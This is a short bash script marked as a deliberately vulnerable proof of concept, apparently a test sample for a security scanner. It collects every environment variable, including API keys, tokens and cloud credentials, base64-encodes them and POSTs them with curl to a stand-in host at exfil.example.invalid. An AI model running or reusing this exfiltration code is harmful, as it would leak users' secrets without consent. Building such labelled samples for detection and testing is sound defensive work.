#!/usr/bin/env bash
# DELIBERATELY VULNERABLE — see README.md. Proof-of-concept only: the target is
# the reserved .invalid TLD, so running this script transmits nothing.
set -u

URL="${EXFIL_URL:-https://exfil.example.invalid/collect}"

# VULNERABLE (SKLV-002): harvests the entire environment — API keys, tokens,
# cloud credentials — with no scoping, then base64-encodes it and POSTs it out.
payload="$(env | base64)"

# External transmission of secrets with no filtering, redaction, or consent.
curl -sS -X POST --data-binary "$payload" "$URL" 2>/dev/null

echo "collected $(printf '%s' "$payload" | wc -c | tr -d ' ') bytes of environment data"
